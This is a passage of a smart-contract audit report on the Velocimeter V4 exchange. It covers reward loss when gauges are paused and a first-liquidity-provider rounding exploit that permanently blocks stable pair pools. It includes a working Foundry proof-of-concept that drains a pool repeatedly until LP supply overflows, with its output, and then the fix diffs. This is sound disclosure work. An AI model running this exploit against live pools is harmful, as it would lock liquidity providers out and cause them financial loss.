    function testPauseDistributeRewards() public {
        initializeVotingEscrow();

        FLOW.approve(address(router), TOKEN_1);
        FRAX.approve(address(router), TOKEN_1);
        router.addLiquidity(address(FRAX), address(FLOW), false, TOKEN_1, TOKEN_1, 0, 0, address(owner), block.timestamp);
        address pair1 = router.pairFor(address(FRAX), address(FLOW), false);
        address pair2 = router.pairFor(address(DAI), address(FLOW), false);

        voter.createGauge(pair2, 0);
        address gauge = voter.gauges(pair2);

        address[] memory pools = new address[](2);
        pools[0] = pair1;
        pools[1] = pair2;
        uint256[] memory weights = new uint256[](2);
        weights[0] = 9899;
        weights[1] = 101;

        _elapseOneWeek();

        voter.vote(1, pools, weights);
        minter.update_period(); // give rewards to Voter contract
        voter.updateGauge(address(gauge)); // update rewards for gauge

        // expect distribution
        assertGt(voter.claimable(address(gauge)), 0);
        console.log("Claimable rewards before pausing: ", voter.claimable(address(gauge)));
        console.log("Gauge balance before pause: ", FLOW.balanceOf(gauge));

        _elapseOneWeek();

        voter.distribute(gauge); // distribute rewards when pausing
        voter.pauseGauge(address(gauge));
        vm.warp(block.timestamp + 1 days); // admin decides to unpause next day
        voter.restartGauge(address(gauge));

        assertEq(voter.claimable(address(gauge)), 0);
        console.log("Claimable rewards after unpausing next day: ", voter.claimable(address(gauge)));
        console.log("Gauge balance after unpause: ", FLOW.balanceOf(gauge));
    }
```

Console Output
This test displays the problem, with all rewards being lost when pausing/unpausing gauges:

```text
Running 1 test for test/Minter.t.sol:MinterTest
[PASS] testPauseRewardsLost() (gas: 64083334)
Logs:
  Claimable rewards before pausing:  20199999999999999122
  Gauge balance before pause:  0
  Claimable rewards after unpausing next day:  0
  Gauge balance after unpause:  0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 26.14ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

This test displays the solution to distribute current claimable rewards when pausing:

```text
Running 1 test for test/Minter.t.sol:MinterTest
[PASS] testPauseDistributeRewards() (gas: 64446467)
Logs:
  Claimable rewards before pausing:  20199999999999999122
  Gauge balance before pause:  0
  Claimable rewards after unpausing next day:  0
  Gauge balance after unpause:  40399999999999998244

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.61ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Rewards lost for gauges, causing a loss for voters and LPs. In addition, wasted votes for veNFT holders since they can only vote once per week, and loss of funds for LPs.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Voter.sol#L485-L495

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Voter.sol#L513-L534

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Voter.sol#L549-L562

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Voter.sol#L380-L405

## Tool used

Manual Review

## Recommendation

Consider distributing any claimable rewards to the gauge when pausing:
```diff
    function pauseGauge(address _gauge) external {
        if (msg.sender != emergencyCouncil) {
            require(
                IGaugePlugin(gaugePlugin).checkGaugePauseAllowance(msg.sender, _gauge)
            , "Pause gauge not allowed");
        }
        require(isAlive[_gauge], "gauge already dead");
        isAlive[_gauge] = false;
-       claimable[_gauge] = 0;
+       distribute(_gauge);
        address _pair = IGauge(_gauge).stake(); // TODO: add test cases
        try IPair(_pair).setHasGauge(false) {} catch {}
        emit GaugePaused(_gauge);
    }
```

## [M-1] First Liquidity Provider can DoS stable pair pools by exploiting rounding error

## Summary

The Velocimeter protocol was initially a Velodrome V1 fork, which utilizes x3y+y3x = k AMM. This formula is useful for stablecoin swaps due to the reduced slippage and liquidity efficiency. However, there is a known issue with the k invariant calculation that this protocol uses, where the first LP can exploit a rounding issue such that k = 0, allowing excessive minting until the totalSupply overflows, causing permanent DoS of stable pair pools.

This was found in a recent Spearbit audit of the Velodrome protocol. Although it states that these findings were shared with Velodrome V1 forks, this issue still exists in Velocimeter V4.

## Vulnerability Detail

During swaps, the following require statement checks if the invariant k holds

Pair.sol#L328-L329
```javascript
    // The curve, either x3y+y3x for stable pools, or x*y for volatile pools
    require(_k(_balance0, _balance1) >= _k(_reserve0, _reserve1), 'K'); // Pair: K
```
The function _k utilizes the x3y+y3x curve for stable pairs

Pair.sol#L403-L413
```javascript
    function _k(uint x, uint y) internal view returns (uint) {
        if (stable) {
            uint _x = x * 1e18 / decimals0;
            uint _y = y * 1e18 / decimals1;
@>          uint _a = (_x * _y) / 1e18;
            uint _b = ((_x * _x) / 1e18 + (_y * _y) / 1e18);
@>          return _a * _b / 1e18;  // x3y+y3x >= k
        } else {
            return x * y; // xy >= k
        }
    }
```

We can observe an issue here with the calculation of _a. If (_x * _y) < 1e18, then the value of _a will round down to 0. k = _a * _b / 1e18 will then be equal to 0.

This allows the first LP to carry out the following exploit:

Provide a small amount of liquidity to the pool, such that x * y < 1e18.
Perform the swap operation to drain the pool, which will pass the require(_k(_balance0, _balance1) >= _k(_reserve0, _reserve1), 'K') check since k=0.
Repeat the above steps enough times so that the totalSupply of LP tokens overflows.
After the above steps are executed, if anyone attempts to mint liquidity to the pool, it will revert due to overflow.

Note:

Although the mint function is taken from Uniswap V2, which has sqrt(a * b) > MINIMUM_LIQUIDITY check, this does not protect the invariant formula for stable pair pools.

## Proof of Concept

Add the following to test/Pair.t.sol and run forge test --mt testDestroyPair -vv
```javascript
    function drainPair(Pair pair, uint initialFraxAmount, uint initialDaiAmount) internal {
        DAI.transfer(address(pair), 1);
        uint amount0;
        uint amount1;

        if (address(DAI) < address(FRAX)) {
        amount0 = 0;
        amount1 = initialFraxAmount - 1;
        } else {
        amount1 = 0;
        amount0 = initialFraxAmount - 1;
        }

        pair.swap(amount0, amount1, address(this), new bytes(0));
        FRAX.transfer(address(pair), 1);

        if (address(DAI) < address(FRAX)) {
        amount0 = initialDaiAmount; // initialDaiAmount + 1 - 1
        amount1 = 0;
        } else {
        amount1 = initialDaiAmount; // initialDaiAmount + 1 - 1
        amount0 = 0;
        }

        pair.swap(amount0, amount1, address(this), new bytes(0));
    }
    function testDestroyPair() public {
        votingEscrowMerge();
        deployOwners();
        deployCoins();
        deal(address(DAI), address(this), 100 ether);
        deal(address(FRAX), address(this), 100 ether);
        
        vm.startPrank(owners[0], owners[0]);
        deployPairFactoryAndRouter();
        deployVoter();
        Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true));
        vm.stopPrank();

        for(uint i = 0; i < 10; i++) {
            DAI.transfer(address(pair), 10_000_000);
            FRAX.transfer(address(pair), 10_000_000);
            // as long as 10_000_000^2 < 1e18
            uint liquidity = pair.mint(address(this));
            console.log("pair:", address(pair), "liquidity:", liquidity);
            console.log("total liq:", pair.balanceOf(address(this)));
            drainPair(pair, FRAX.balanceOf(address(pair)) , DAI.balanceOf(address(pair)));
            console.log("DAI balance:", DAI.balanceOf(address(pair)));
            console.log("FRAX balance:", FRAX.balanceOf(address(pair)));
            require(DAI.balanceOf(address(pair)) == 1, "should drain DAI balance");
            require(FRAX.balanceOf(address(pair)) == 2, "should drain FRAX balance");
        }

        DAI.transfer(address(pair), 1 ether);
        FRAX.transfer(address(pair), 1 ether);
        vm.expectRevert();
        pair.mint(address(this)); // will revert due to overflow of totalSupply
    }
```

Console Output
```text
Running 1 test for test/Pair.t.sol:PairTest
[PASS] testDestroyPair() (gas: 55811995)
Logs:
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 9999000
  total liq: 9999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 50000000000000
  total liq: 50000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 250000050000000000000
  total liq: 250000100000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 1250000500000050000000000000
  total liq: 1250000750000150000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 6250003750000750000050000000000000
  total liq: 6250005000001500000200000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 31250025000007500001000000050000000000000
  total liq: 31250031250012500002500000250000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 156250156250062500012500001250000050000000000000
  total liq: 156250187500093750025000003750000300000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 781250937500468750125000018750001500000050000000000000
  total liq: 781251093750656250218750043750005250000350000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 3906255468753281251093750218750026250001750000050000000000000
  total liq: 3906256250004375001750000437500070000007000000400000009999000
  DAI balance: 1
  FRAX balance: 2
  pair: 0x16B791C4D412bF964ccDAb775e72A4a094064C14 liquidity: 19531281250021875008750002187500350000035000002000000050000000000000
  total liq: 19531285156278125013125003937500787500105000009000000450000009999000
  DAI balance: 1
  FRAX balance: 2

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 14.66ms

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Permanent DoS of stable pair pools.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Pair.sol#L328-L329

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Pair.sol#L403-L413

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/Pair.sol#L250

## Tool used

Manual Review

## Recommendation

Velodrome Finance fixed this issue by introducing a MINIMUM_K = 10**10 that stable pair pool deposits must adhere to, and ensuring that stable pair deposits must be equal. Consider making the same changes:
```diff
contract Pair is IPair {

    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    // Used to denote stable or volatile pair, not immutable since construction happens in the initialize method for CREATE2 deterministic addresses
    bool public immutable stable;

    uint public totalSupply = 0;

    mapping(address => mapping (address => uint)) public allowance;
    mapping(address => uint) public balanceOf;

    bytes32 internal DOMAIN_SEPARATOR;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 internal constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;

    uint internal constant MINIMUM_LIQUIDITY = 10**3;
+   uint256 internal constant MINIMUM_K = 10**10;

    address public immutable token0;
    address public immutable token1;
    address immutable factory;
    address public externalBribe;
    address public voter;
    bool public hasGauge;
    function mint(address to) external lock returns (uint liquidity) {
        (uint _reserve0, uint _reserve1) = (reserve0, reserve1);
        uint _balance0 = IERC20(token0).balanceOf(address(this));
        uint _balance1 = IERC20(token1).balanceOf(address(this));
        uint _amount0 = _balance0 - _reserve0;
        uint _amount1 = _balance1 - _reserve1;

        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY;
            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens
+           if (stable) {
+           require((_amount0 * 1e18) / decimals0 == (_amount1 * 1e18) / decimals1, "Pair: stable deposits must be equal");
+           require(_k(_amount0, _amount1) > MINIMUM_K, "Pair: stable deposits must be above minimum k");
+           }
        } else {
            liquidity = Math.min(_amount0 * _totalSupply / _reserve0, _amount1 * _totalSupply / _reserve1);
        }
        require(liquidity > 0, 'ILM'); // Pair: INSUFFICIENT_LIQUIDITY_MINTED
        _mint(to, liquidity);

        _update(_balance0, _balance1, _reserve0, _reserve1);
        emit Mint(msg.sender, _amount0, _amount1);
    }
```
